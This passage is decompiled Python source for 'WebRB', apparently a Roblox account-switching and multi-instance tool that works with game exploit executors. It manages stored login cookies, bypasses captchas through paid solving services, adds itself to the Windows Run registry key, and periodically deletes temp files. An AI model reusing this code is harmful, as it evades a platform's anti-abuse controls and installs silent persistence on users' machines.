# -*- coding: utf-8 -*-
"""
Reconstructed source for `WebRB.py` (`__main__`) from `WebRB.dll` (Nuitka Commercial Python 3.11).
Version: 0.5.3.3
"""

import time
import json
import psutil
import os
import random
import requests
import threading
import subprocess
import sys
import ctypes
import win32process
import win32gui
import gc
import hashlib
import yummypack
import socket
import ssl
import keyboard
import traceback
import shutil
import msvcrt
import mss
import platform
import asyncio
import base64
import aiohttp
import importlib
import atexit
import websockets
import zipfile
import re
import secrets
import gzip
import string
import urllib.parse
import urllib
import uuid
import logging
import win32con
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.utils import parsedate_to_datetime
from solve_captcha import solve_captcha
from solve_in_app import solve_captcha as solve_in_app_captcha
import wmi
from PIL import ImageGrab
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime, timedelta, timezone
import winreg as reg
from colorama import Fore, init
import pygetwindow as gw
from urllib.parse import urlparse, parse_qs
from ctypes import wintypes, byref
import warnings
from collections import defaultdict
from urllib3.exceptions import InsecureRequestWarning
from nacl.signing import SigningKey
from nacl.public import PrivateKey, PublicKey, Box
from nacl.utils import random as nacl_random
from nacl.exceptions import CryptoError
import keyring
import socketio

warnings.simplefilter("ignore", InsecureRequestWarning)
os.system("cls")

logging.getLogger("websockets.protocol").setLevel(logging.WARNING)
logging.getLogger("websockets.server").setLevel(logging.WARNING)
logging.getLogger("websockets.client").setLevel(logging.WARNING)
logging.getLogger("websockets.legacy.protocol").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.ERROR)

version = "0.5.3.3"
init(autoreset=True)
os.makedirs("log", exist_ok=True)
logging.basicConfig(
    filename="log/log.txt",
    level=logging.ERROR,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

for _lg_name in ("engineio", "engineio.client", "socketio", "socketio.client"):
    lg = logging.getLogger(_lg_name)
    lg.setLevel(logging.CRITICAL)
    lg.propagate = False
    lg.handlers.clear()

# Disable Windows Console QuickEdit & Mouse Input
ENABLE_QUICK_EDIT = 0x0040
ENABLE_INSERT_MODE = 0x0020
ENABLE_MOUSE_INPUT = 0x0010
kernel32 = ctypes.windll.kernel32
hStdin = kernel32.GetStdHandle(-10)
mode = ctypes.c_uint()
if kernel32.GetConsoleMode(hStdin, byref(mode)):
    new_mode = mode.value & ~(ENABLE_QUICK_EDIT | ENABLE_MOUSE_INPUT)
    kernel32.SetConsoleMode(hStdin, new_mode)


# ============================================================================
# Logging Helpers
# ============================================================================

def log(message: str, level: str = "~") -> None:
    colors = {
        "~": Fore.CYAN,
        "+": Fore.GREEN,
        "!": Fore.YELLOW,
        "-": Fore.RED,
        "^": Fore.MAGENTA,
    }
    color = colors.get(level.upper(), Fore.WHITE)
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] [{level.upper():^3}] {message}")


def info(msg: str):
    log(msg, "~")


def success(msg: str):
    log(msg, "+")


def warn(msg: str):
    log(msg, "!")


def error(msg: str):
    log(msg, "-")


def purple(msg: str):
    log(msg, "^")


# ============================================================================
# User ID Encoding & Captcha Solver Rate-Limiting
# ============================================================================

USER_ID_PRIVATE_KEY = "webrb-local-private-key-v1"
USER_ID_PRIVATE_KEY_PREFIX = "enc-v1:"


def _encode_user_id_for_tool(value) -> str:
    plain = str(value or "").strip()
    if not plain:
        return ""
    key = USER_ID_PRIVATE_KEY.encode("utf-8")
    key_len = len(key)
    plain_bytes = plain.encode("utf-8")
    encrypted = bytes(b ^ key[idx % key_len] for idx, b in enumerate(plain_bytes))
    token = base64.urlsafe_b64encode(encrypted).decode("ascii").rstrip("=")
    return f"{USER_ID_PRIVATE_KEY_PREFIX}{token}"


_solve_captcha_lock = threading.Lock()
_solve_captcha_calls = {}
_solve_captcha_failures = {}


def _solve_captcha_account_key(username, cookie_value) -> str:
    if username:
        return str(username).strip()
    if cookie_value:
        return str(cookie_value).strip()[:32]
    return "__unknown__"


def _can_run_solve_captcha(cfg, account_key) -> bool:
    if not cfg.get("Limit Solve Captcha Calls"):
        return True
    with _solve_captcha_lock:
        used_calls = _solve_captcha_calls.get(account_key, 0)
        if used_calls >= 2:
            warn(f"Solve Captcha skipped ({account_key}): reached limit (2).")
            return False
        _solve_captcha_calls[account_key] = used_calls + 1
        return True


def _record_solve_captcha_result(account_key, status):
    with _solve_captcha_lock:
        if status == "failed":
            _solve_captcha_failures[account_key] = _solve_captcha_failures.get(account_key, 0) + 1
        else:
            _solve_captcha_failures.pop(account_key, None)


def _get_solve_captcha_failures(account_key) -> int:
    with _solve_captcha_lock:
        return _solve_captcha_failures.get(account_key, 0)


def _reset_solve_captcha_counters(account_key):
    with _solve_captcha_lock:
        _solve_captcha_calls.pop(account_key, None)
        _solve_captcha_failures.pop(account_key, None)


def _is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe_sock:
        probe_sock.settimeout(0.2)
        return probe_sock.connect_ex(("127.0.0.1", port)) == 0


def _pick_remote_debug_port() -> int:
    start_port, end_port, max_attempts = 30000, 65000, 120
    for _ in range(max_attempts):
        candidate = random.randint(start_port, end_port)
        if not _is_port_in_use(candidate):
            return candidate
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as fallback_sock:
        fallback_sock.bind(("127.0.0.1", 0))
        return fallback_sock.getsockname()[1]


def _start_solve_in_app_thread(port, solver_client_key=None, solver_provider="yescaptcha"):
    try:
        threading.Thread(
            target=solve_in_app_captcha,
            kwargs={
                "port": port,
                "client_key": solver_client_key,
                "captcha_provider": solver_provider,
            },
            daemon=True,
        ).start()
    except Exception as e:
        warn(f"Failed to start solve_in_app thread: {e}")


def solve_captcha_with_limit(username, cookie_value, cfg, stage_callback=None):
    account_key = _solve_captcha_account_key(username, cookie_value)
    if not _can_run_solve_captcha(cfg, account_key):
        return "limit_reached"
    status = solve_captcha(
        cookie_value,
        pow_only=bool(cfg.get("Solve Pow Only")),
        stage_callback=stage_callback,
    )
    _record_solve_captcha_result(account_key, status)
    return status


# ============================================================================
# Process & File Bootstrap Helpers
# ============================================================================

def kill_other_webrb_exe():
    current_pid = os.getpid()
    for p in psutil.process_iter(attrs=["pid", "name", "exe"]):
        try:
            if p.info["pid"] == current_pid:
                continue
            name = (p.info.get("name") or "").lower()
            exe = (p.info.get("exe") or "").lower()
            if name == "webrb.exe" or exe.endswith("\\webrb.exe"):
                p.terminate()
                try:
                    p.wait(timeout=2)
                except Exception:
                    p.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass


def detect_base_path():
    current_dir = os.getcwd()
    return current_dir


def ensure_file_exists(folder, filename):
    os.makedirs(folder, exist_ok=True)
    file_path = os.path.join(folder, filename)
    if not os.path.exists(file_path):
        with open(file_path, "w", encoding="utf-8") as f:
            pass
    return file_path


folders_files = [
    ["stored", "savedata.txt"],
    ["switched", "storeddata.txt"],
    ["switched", "deadcookie.txt"],
    ["stored", "privateserver.txt"],
    ["switched", "banned.txt"],
    ["stored", "storeddeadck.txt"],
]


def ensure_yummyauto_service(
    service_exe_path="yummyauto_service.exe",
    bootstrap_name="bootstrap.exe",
    wait=False,
    timeout=30,
    poll=0.5,
):
    service_path = Path(service_exe_path)
    service_name = service_path.name.lower()

    def _find_pid():
        for p in psutil.process_iter(attrs=["name", "exe"]):
            try:
                name = (p.info.get("name") or "").lower()
                exe = (p.info.get("exe") or "").lower()
                if name == service_name or exe.endswith(service_name):
                    return p.pid
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return None

    pid = _find_pid()
    if pid is not None:
        return {"started_bootstrap": False, "service_running": True, "pid": pid}
    try:
        if os.path.exists("boostrap.exe"):
            os.startfile("boostrap.exe")
        elif os.path.exists(bootstrap_name):
            os.startfile(bootstrap_name)
        else:
            return {"started_bootstrap": True, "reason": "service_exe_missing"}
    except Exception:
        pass
    return {"started_bootstrap": True, "reason": "bootstrap_started_but_service_not_detected"}


info("Checking YummyServices")
ensure_yummyauto_service()

for folder, filename in folders_files:
    ensure_file_exists(folder, filename)

PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04
appdata_path = os.getenv("LOCALAPPDATA")


# ============================================================================
# UTC Time Synchronization (API + HTTP Date + NTP)
# ============================================================================

current_utc_time = None
last_request_time = None
_lock = threading.Lock()
_anchor_utc = None
_anchor_mono = None
_last_attempt_mono = None
_last_success_mono = None
_inflight = False
_utc_source = None
_utc_shutdown = threading.Event()

UTC_API_URLS = (
    "https://cdn.yummywebplayer.click/utc",
    "https://api-am.yummydata.click/utc",
    "https://api-pet99.yummydata.click/utc",
)
UTC_HTTP_DATE_URLS = (
    "https://microsoft.com",
    "https://google.com",
    "https://cloudflare.com",
)
UTC_NTP_SERVERS = [
    "time.cloudflare.com",
    "time.google.com",
    "time.windows.com",
    "pool.ntp.org",
]
UTC_STATE_FILE = os.path.join("stored", "utc_state.json")
UTC_HTTP_TIMEOUT = (1.5, 1.5)
UTC_NTP_TIMEOUT = 1.5
UTC_SYNC_INTERVAL = 60
UTC_LOOP_SLEEP = 0.25


def _utc_now():
    return datetime.now(timezone.utc).replace(tzinfo=None)


def _set_utc_source(source: str):
    global _utc_source
    previous = _utc_source
    _utc_source = source
    if source == "cache-offset" and previous != "cache-offset":
        warn("UTC live sync failed, using cached server offset.")
    elif source == "local-fallback" and previous != "local-fallback":
        warn("UTC live sync failed, using local clock as last resort.")
    elif previous in ("cache-offset", "local-fallback") and source not in ("cache-offset", "local-fallback"):
        info(f"UTC sync restored via {source}")


def _save_utc_state(server_dt: datetime):
    try:
        os.makedirs(os.path.dirname(UTC_STATE_FILE), exist_ok=True)
        local_dt = _utc_now()
        payload = {
            "server_utc": server_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "local_utc": local_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "offset_seconds": (server_dt - local_dt).total_seconds(),
            "saved_at": local_dt.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open(UTC_STATE_FILE, "w", encoding="utf-8") as file:
            json.dump(payload, file)
    except Exception:
        pass


def _load_cached_utc_time():
    try:
        with open(UTC_STATE_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
        offset_seconds = float(data["offset_seconds"])
        return _utc_now() + timedelta(seconds=offset_seconds)
    except Exception:
        return None


def _fetch(url: str):
    try:
        r = requests.get(url, timeout=UTC_HTTP_TIMEOUT)
        if r.status_code == 200:
            s = r.json()["utc_time"]
            return datetime.strptime(s, "%Y-%m-%d %H:%M:%S")
    except Exception:
        pass
    return None


def _fetch_http_date(url: str):
    try:
        r = requests.head(url, timeout=UTC_HTTP_TIMEOUT, allow_redirects=True)
        date_header = r.headers.get("Date")
        if date_header:
            dt = parsedate_to_datetime(date_header)
            if dt.tzinfo is not None:
                dt = dt.astimezone(timezone.utc).replace(tzinfo=None)
            return dt
    except Exception:
        pass
    return None


def _fetch_ntp_time(host: str):
    try:
        packet = b"\x23" + b"\x00" * 47
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(UTC_NTP_TIMEOUT)
            started = time.monotonic()
            sock.sendto(packet, (host, 123))
            data, _ = sock.recvfrom(48)
            finished = time.monotonic()
        if len(data) < 48:
            return None
        mode = data[0] & 0x07
        stratum = data[1]
        if mode not in (4, 5) or stratum == 0:
            return None
        seconds = int.from_bytes(data[40:44], "big") - 2208988800
        fraction = int.from_bytes(data[44:48], "big") / 4294967296.0
        unix_time = seconds + fraction + (finished - started) / 2.0
        return datetime.utcfromtimestamp(unix_time)
    except Exception:
        pass
    return None


def _run_utc_jobs(jobs):
    if _utc_shutdown.is_set():
        return None, None
    try:
        with ThreadPoolExecutor(max_workers=len(jobs)) as executor:
            futures = {executor.submit(fn, arg): tag for fn, arg, tag in jobs}
            for future in as_completed(futures):
                try:
                    dt = future.result()
                    if dt is not None:
                        return dt, futures[future]
                except Exception:
                    pass
    except RuntimeError as exc:
        if "interpreter shutdown" in str(exc):
            _utc_shutdown.set()
    return None, None


def _resolve_live_utc_time():
    primary_jobs = [(_fetch, u, f"api:{urlparse(u).netloc}") for u in UTC_API_URLS]
    dt, source = _run_utc_jobs(primary_jobs)
    if dt is not None:
        return dt, source
    fallback_jobs = [(_fetch_http_date, u, f"http-date:{urlparse(u).netloc}") for u in UTC_HTTP_DATE_URLS]
    fallback_jobs.extend((_fetch_ntp_time, host, f"ntp:{host}") for host in UTC_NTP_SERVERS)
    return _run_utc_jobs(fallback_jobs)


def get_utc_time():
    global current_utc_time, last_request_time, _anchor_utc, _anchor_mono, _last_attempt_mono, _last_success_mono, _inflight
    if _utc_shutdown.is_set():
        return current_utc_time or _utc_now()
    with _lock:
        if _inflight:
            return current_utc_time or _utc_now()
        _inflight = True
        _last_attempt_mono = time.monotonic()
    try:
        mono = time.monotonic()
        dt, source = _resolve_live_utc_time()
        if dt is not None:
            with _lock:
                _anchor_utc = dt
                _anchor_mono = mono
                _last_success_mono = mono
                current_utc_time = dt
                last_request_time = _utc_now()
            _set_utc_source(source)
            _save_utc_state(dt)
            return current_utc_time
        with _lock:
            if _anchor_utc is not None and _anchor_mono is not None:
                current_utc_time = _anchor_utc + timedelta(seconds=(mono - _anchor_mono))
                return current_utc_time
        cached_dt = _load_cached_utc_time()
        if cached_dt is not None:
            with _lock:
                _anchor_utc = cached_dt
                _anchor_mono = mono
                _last_success_mono = mono
                current_utc_time = cached_dt
                last_request_time = _utc_now()
            _set_utc_source("cache-offset")
            return current_utc_time
        local_dt = _utc_now()
        with _lock:
            _anchor_utc = local_dt
            _anchor_mono = mono
            current_utc_time = local_dt
            last_request_time = local_dt
        _set_utc_source("local-fallback")
        return current_utc_time
    finally:
        with _lock:
            _inflight = False


def update_utc_time():
    global current_utc_time
    while not _utc_shutdown.is_set():
        try:
            now_m = time.monotonic()
            need_sync = False
            with _lock:
                if _anchor_utc is not None and _anchor_mono is not None:
                    elapsed = now_m - _anchor_mono
                    current_utc_time = _anchor_utc + timedelta(seconds=elapsed)
                if _last_attempt_mono is None or (now_m - _last_attempt_mono) >= UTC_SYNC_INTERVAL:
                    need_sync = True
            if need_sync:
                get_utc_time()
            _utc_shutdown.wait(UTC_LOOP_SLEEP)
        except RuntimeError as exc:
            if "interpreter shutdown" in str(exc):
                _utc_shutdown.set()
                break
        except Exception:
            time.sleep(UTC_LOOP_SLEEP)


def _stop_utc_updater():
    _utc_shutdown.set()


atexit.register(_stop_utc_updater)
get_utc_time()
time_updater = threading.Thread(target=update_utc_time, daemon=True)
time_updater.start()


# ============================================================================
# Configuration & Default JSON Schemas
# ============================================================================

def reset_to_defaults(file_path, default_data):
    with open(file_path, "w", encoding="utf-8-sig") as file:
        json.dump(default_data, file, indent=4)
    info(f"{file_path} has been reset to default values.")


def validate_and_reset(file_path, default_data):
    if not os.path.exists(file_path):
        info(f"{file_path} does not exist. Resetting to default.")
        reset_to_defaults(file_path, default_data)
        return
    try:
        with open(file_path, "r", encoding="utf-8-sig") as file:
            json.load(file)
    except json.JSONDecodeError:
        info(f"{file_path} cannot be loaded. Resetting to default.")
        reset_to_defaults(file_path, default_data)


def _coerce(v, t):
    if t is bool:
        if isinstance(v, str):
            return v.strip().lower() in ("1", "true", "yes", "on")
        return bool(v)
    if t is int:
        try:
            return int(v)
        except Exception:
            return 0
    if t is str:
        if isinstance(v, (int, float)):
            return str(v)
        return str(v) if v is not None else "0"
    return v


def _merge_defaults(defaults, data, strict=False, coerce_types=False):
    if not isinstance(data, dict):
        return json.loads(json.dumps(defaults)), True
    changed = False
    out = {}
    for k, dv in defaults.items():
        if k not in data:
            out[k] = dv
            changed = True
        else:
            v = data[k]
            if isinstance(dv, dict):
                nv, ch = _merge_defaults(dv, v, strict=strict, coerce_types=coerce_types)
                out[k] = nv
                if ch:
                    changed = True
            elif coerce_types and not isinstance(v, type(dv)):
                cv = _coerce(v, type(dv))
                out[k] = cv
                changed = True
            else:
                out[k] = v
    if not strict:
        for k in data:
            if k not in defaults:
                out[k] = data[k]
    else:
        if any(k not in defaults for k in data):
            changed = True
    return out, changed


SPECIAL_ZERO_KEYS = [
    "Alucard Fragment",
    "Confetti",
    "Dark Fragment",
    "Dragon Egg",
    "Leviathan Heart",
    "Monster Magnet",
    "Nightmare Catcher",
    "Volcanic Magnet",
]


def _normalize_bloxfruit_zero_fields(cfg):
    changed = False
    for k in SPECIAL_ZERO_KEYS:
        if k in cfg:
            v = cfg[k]
            if isinstance(v, bool) or v is None or (isinstance(v, str) and not v.strip()):
                cfg[k] = "0"
                changed = True
            elif isinstance(v, (int, float)):
                cfg[k] = str(int(v))
                changed = True
    return changed


def validate_fill_defaults(file_path, defaults, strict=False, coerce_types=False, encoding="utf-8-sig"):
    if not os.path.exists(file_path):
        with open(file_path, "w", encoding=encoding) as f:
            json.dump(defaults, f, ensure_ascii=False, indent=2)
        return defaults
    try:
        with open(file_path, "r", encoding=encoding) as f:
            data = json.load(f)
    except Exception:
        with open(file_path, "w", encoding=encoding) as f:
            json.dump(defaults, f, ensure_ascii=False, indent=2)
        return defaults
    merged, changed = _merge_defaults(defaults, data, strict=strict, coerce_types=coerce_types)
    ch2 = _normalize_bloxfruit_zero_fields(merged)
    if changed or ch2:
        with open(file_path, "w", encoding=encoding) as f:
            json.dump(merged, f, ensure_ascii=False, indent=2)
    return merged


def update_yescaptcha_client_key(client_key, config_path=None):
    path = config_path or os.path.join("yescaptcha", "config.js")
    if not os.path.exists(path):
        return False
    try:
        with open(path, "r", encoding="utf-8") as f:
            text = f.read()
        pattern = r"(clientKey\s*:\s*)([\'\"])(.*?)(\2)"

        def _repl(match):
            quote = match.group(2)
            return f"{match.group(1)}{quote}{client_key}{quote}"

        new_text, count = re.subn(pattern, _repl, text, count=1)
        if count > 0 and new_text != text:
            with open(path, "w", encoding="utf-8") as f:
                f.write(new_text)
        return True
    except Exception:
        return False


def update_omocaptcha_client_key(client_key, config_path=None):
    path = config_path or os.path.join("omocaptcha", "configs.json")
    if not os.path.exists(path):
        return False
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        if data.get("api_key") != client_key:
            data["api_key"] = client_key
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception:
        return False


bloxfruit_default = {
    "Level": "2600",
    "Beli": "0",
    "Fragment": "0",
    "Tier": "0",
    "Bounty_Honor": "0",
    "Sanguine Art": False,
    "Race Awakening": "",
    "Race V3": False,
    "Godhuman": True,
    "Cursed Dual Katana": False,
    "True Triple Katana": False,
    "Hallow Scythe": False,
    "Shark Anchor": False,
    "Rengoku": False,
    "Tushita": False,
    "Spikey Trident": False,
    "Yama": False,
    "Skull Guitar": False,
    "Pull Lever": False,
    "Full Gear": False,
    "Mirror Fractal": False,
    "Valkyrie Helm": False,
    "Pale Scarf": False,
    "Swan Glasses": False,
    "Alucard Fragment": "0",
    "Confetti": "0",
    "Dark Fragment": "0",
    "Dragon Egg": "0",
    "Leviathan Heart": "0",
    "Monster Magnet": "0",
    "Nightmare Catcher": "0",
    "Volcanic Magnet": "0",
}

pet99_default = {
    "Bucket": 5,
    "Rank": 3,
    "UnlockedZones": 2,
    "Gem": 20,
    "Rebirth": 1,
}

dfbloxfruit_default = {
    "Dough-Dough": True,
    "Dragon-Dragon": True,
    "Kitsune-Kitsune": True,
    "T-Rex-T-Rex": True,
    "Gas-Gas": True,
    "Yeti-Yeti": True,
    "Mammoth-Mammoth": True,
    "Tiger-Tiger": True,
    "Control-Control": True,
    "Venom-Venom": True,
    "Shadow-Shadow": True,
    "Spirit-Spirit": True,
    "Gravity-Gravity": True,
}

bloxfruit_file = "stored/bloxfruit.json"
dfbloxfruit_file = "stored/dfbloxfruit.json"
ispushautoexc = False

os.makedirs("stored", exist_ok=True)
validate_and_reset(bloxfruit_file, bloxfruit_default)
validate_fill_defaults("stored/bloxfruit.json", bloxfruit_default, strict=False, coerce_types=True)
validate_fill_defaults("stored/dfbloxfruit.json", dfbloxfruit_default, strict=False, coerce_types=True)
validate_and_reset(dfbloxfruit_file, dfbloxfruit_default)
validate_and_reset("stored/pet99.json", pet99_default)


def fix_unescaped_backslashes(content: str) -> str:
    def replacer(match):
        bs = match.group(0)
        return bs if len(bs) % 2 == 0 else bs * 2

    return re.sub(r"\\+", replacer, content)


def _detect_workspace_from_localappdata():
    base_dir = os.getenv("LOCALAPPDATA")
    if not base_dir:
        return None, None
    candidates = [
        (os.path.join(base_dir, "Volt", "workspace"), os.path.join(base_dir, "Volt")),
        (os.path.join(base_dir, "seliware-workspace"), os.path.join(base_dir, "seliware")),
        (os.path.join(base_dir, "Wave", "workspace"), os.path.join(base_dir, "Wave")),
    ]
    for workspace, custom_dir in candidates:
        if os.path.exists(workspace):
            return workspace, custom_dir
    return None, None


def validate_config(config, file_path="config.json"):
    affinity_core = config.get("Affinity Core")
    if not isinstance(affinity_core, int) or affinity_core <= 0:
        warn("Affinity Core must be an integer greater than 0. Resetting to default value (4)")
        config["Affinity Core"] = 4

    workspace_folder = str(config.get("Exploit WorkSpace Folder", "")).strip()
    workspace_lower = workspace_folder.lower()
    if not any(sub in workspace_lower for sub in ("workspace", "workspaces")):
        detected_ws, detected_custom = _detect_workspace_from_localappdata()
        if detected_ws:
            config["Exploit WorkSpace Folder"] = detected_ws
            if detected_custom:
                config["Custom Exploit Folder"] = detected_custom
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(config, f, indent=4)
        else:
            error(
                f"The path '{workspace_folder}' must include the word 'workspace' or 'workspaces'. "
                "Please correct Exploit WorkSpace Folder."
            )
    if "potassium" in workspace_lower:
        warn(
            "If u are using potassium on win 11 please move tool folder to C:\\ Folder "
            "(Ignore this message if u already did that)."
        )
        time.sleep(3)
    return config


def apply_workspace_custom_defaults(config, file_path="config.json"):
    base_dir = os.getenv("LOCALAPPDATA")
    if not base_dir:
        return config
    workspace = str(config.get("Exploit WorkSpace Folder", "")).strip()
    workspace_norm = os.path.normcase(os.path.normpath(workspace)) if workspace else ""
    volt_workspace = os.path.normcase(os.path.normpath(os.path.join(base_dir, "Volt", "workspace")))
    wave_workspace = os.path.normcase(os.path.normpath(os.path.join(base_dir, "Wave", "workspace")))
    seli_workspace = os.path.normcase(os.path.normpath(os.path.join(base_dir, "seliware-workspace")))
    if workspace_norm == volt_workspace:
        config["Custom Exploit Folder"] = os.path.join(base_dir, "Volt")
    elif workspace_norm == wave_workspace:
        config["Custom Exploit Folder"] = os.path.join(base_dir, "Wave")
    elif workspace_norm == seli_workspace:
        config["Custom Exploit Folder"] = os.path.join(base_dir, "seliware")
    return config


def adjust_windows_per_rows(config):
    if config.get("Windows Per Rows") == 20 and not config.get("Old Sort"):
        user32 = ctypes.windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        if screen_width == 1920 and screen_height == 1080:
            config["Windows Per Rows"] = 10
            warn("Detected screen resolution 1920x1080, setting 'Windows Per Rows' to 10.")


def _norm_path(p):
    return os.path.normcase(os.path.abspath(p))


def _get_temp_dir():
    return (
        os.getenv("TEMP")
        or os.getenv("TMP")
        or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
    )


def _find_newest_onefile_paths(entries, keep_count=3):
    newest = []
    for entry in entries:
        try:
            if "onefile" in entry.name.lower():
                mtime = entry.stat(follow_symlinks=False).st_mtime
                newest.append((mtime, entry.path))
        except Exception:
            pass
    newest.sort(reverse=True)
    keep = set()
    for _, path in newest[:keep_count]:
        keep.add(_norm_path(path))
    return keep


def _delete_temp_entries(entries, keep_paths=None):
    keep_norm = set(keep_paths or ())
    for entry in entries:
        try:
            path = entry.path
            if _norm_path(path) in keep_norm:
                continue
            if entry.is_dir(follow_symlinks=False):
                shutil.rmtree(path, ignore_errors=True)
            else:
                os.remove(path)
        except Exception:
            pass


def auto_delete_temp_loop(interval_seconds=300):
    while True:
        try:
            temp_dir = _get_temp_dir()
            if temp_dir and os.path.isdir(temp_dir):
                with os.scandir(temp_dir) as it:
                    entries = list(it)
                keep_paths = _find_newest_onefile_paths(entries, keep_count=3)
                _delete_temp_entries(entries, keep_paths=keep_paths)
        except Exception:
            pass
        time.sleep(interval_seconds)


DEFAULT_CONFIG = {
    "Exploit WorkSpace Folder": "C:\\Users\\PC\\AppData\\Local\\Wave\\workspace",
    "Custom Exploit Folder": "C:\\Users\\PC\\AppData\\Local\\ui",
    "PlaceId": "16732694052",
    "DelayOpen": 60,
    "Sort": False,
    "Minimize": False,
    "Private Server": False,
    "Change Account Bloxfruit": False,
    "Display Username": True,
    "Total Instance": 30,
    "Set Affinity": False,
    "Set Priority Low": False,
    "Restart Roblox Every [H]": 999,
    "Kill Process > Ram": False,
    "Ram Usage (Each Process)": 3,
    "Change Account (Custom)": False,
    "Check Banned Account and Change": False,
    "Startup With Windows": True,
    "Affinity Core": 4,
    "Thread Check Cookie": 30,
    "Fps Unlocker Folder": "C:\\Users\\PC\\Desktop\\Roblox\\FpsUnlocker",
    "Delay Prevent Same Account": 20,
    "Auto Detect/Run Update.exe": True,
    "Webhook Url": "",
    "Webhook Delay Send [M]": 20,
    "Change Account Pet99": False,
    "Delay Minimize": 5,
    "Mute Sounds": False,
    "Windows Per Rows": 10,
    "Fixed Size": "150x150",
    "Old Sort": False,
    "Use With RobloxAccManager": False,
    "Run Multi PlaceId": False,
    "Low Server": False,
    "Enable Multi Instances": True,
    "Check More Infor When Change Acc Bloxfruit": False,
    "Delete the account after changing the account": False,
    "Close Roblox (Captcha)": False,
    "Close Roblox (Captcha) Delay": 30,
    "Threading Delay": 30,
    "Custom ApiKey": "",
    "Custom ApiURL": "",
    "Hourly Change Account": False,
    "Hourly Change Account [H]": 5,
    "Change Account (Captcha)": False,
    "Suspend Roblox After Launch": False,
    "Suspend Roblox After Launch [s]": 5,
    "Disable Kill Suspended Roblox": False,
    "Kill Seliware Error Message": False,
    "Solve Captcha": False,
    "Solve Captcha Only": False,
    "Limit Solve Captcha Calls": False,
    "Skip Solve Captcha In Browser": False,
    "Solve Pow Only": False,
    "Check Captcha Before Teleport": False,
    "Yescaptcha Key": "",
    "Omocaptcha Key": "",
    "Change Account When Captcha Unsolved": False,
    "Auto-fetch accounts VIP server": False,
    "Auto Delete Temp": False,
}


def read_or_create_config(auth, file_path="config.json"):
    default_config = dict(DEFAULT_CONFIG)
    if not os.path.exists(file_path):
        info(f"{file_path} not found. Creating a new one with default values.")
        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(default_config, file, indent=4)
        config = dict(default_config)
    else:
        with open(file_path, "r", encoding="utf-8-sig") as file:
            content = file.read()
        try:
            config = json.loads(content)
        except json.JSONDecodeError:
            info(f"{file_path} is invalid. Attempting to fix unescaped backslashes.")
            fixed_content = fix_unescaped_backslashes(content)
            try:
                config = json.loads(fixed_content)
                info("Repaired file config.")
                with open(file_path, "w", encoding="utf-8") as file:
                    json.dump(config, file, indent=4)
            except json.JSONDecodeError:
                warn(f"Unable to fix {file_path}. Creating a new one with default values.")
                config = dict(default_config)
                with open(file_path, "w", encoding="utf-8") as file:
                    json.dump(config, file, indent=4)

    if "Set Priority High" in config and "Set Priority Low" not in config:
        config["Set Priority Low"] = config.pop("Set Priority High")

    keys_to_remove = [k for k in config if k not in default_config]
    if keys_to_remove:
        warn(f"Removing extra keys from {file_path}: {keys_to_remove}")
        for key in keys_to_remove:
            config.pop(key, None)
        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(config, file, indent=4)
        info(f"{file_path} has been updated to remove extra keys.")

    updated = False
    for key, value in default_config.items():
        if key not in config:
            info(f"Key '{key}' missing in {file_path}. Adding default value.")
            config[key] = value
            updated = True
    if updated:
        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(config, file, indent=4)
        info(f"{file_path} has been updated with missing keys.")

    config = validate_config(config, file_path)
    adjust_windows_per_rows(config)
    return config


def read_or_create_auth(file_path="auth.json"):
    default_auth = {"UserID (UUID)": "", "Key": "", "Note": ""}
    if not os.path.exists(file_path):
        warn(f"{file_path} not found. Creating a new one with default values.")
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(default_auth, f, indent=4)
        return default_auth
    try:
        with open(file_path, "r", encoding="utf-8-sig") as f:
            auth = json.load(f)
    except json.JSONDecodeError:
        error(f"{file_path} is invalid. Creating a new one with default values.")
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(default_auth, f, indent=4)
        return default_auth
    updated = False
    for key, value in default_auth.items():
        if key not in auth:
            warn(f"Key '{key}' missing in {file_path}. Adding default value.")
            auth[key] = value
            updated = True
    if updated:
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(auth, f, indent=4)
        success(f"{file_path} has been updated with missing keys.")
    return auth


lock = threading.Lock()


# ============================================================================
# Windows Startup, Process Memory Scanning, & Presence Tracking
# ============================================================================

def is_process_running(process_name: str) -> bool:
    for process in psutil.process_iter(attrs=["name"]):
        try:
            if (process.info.get("name") or "").lower() == process_name.lower():
                return True
        except Exception:
            pass
    return False


def _get_startup_command() -> str:
    if getattr(sys, "frozen", False):
        target = Path(sys.executable).resolve()
        return f'"{target}"'
    script_path = Path(__file__).resolve()
    python_path = Path(sys.executable).resolve()
    return f'"{python_path}" "{script_path}"'


def add_to_startup(exe_name="WebRB"):
    try:
        command = _get_startup_command()
        key = reg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, subkey, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, exe_name, 0, reg.REG_SZ, command)
        reg.CloseKey(reg_key)
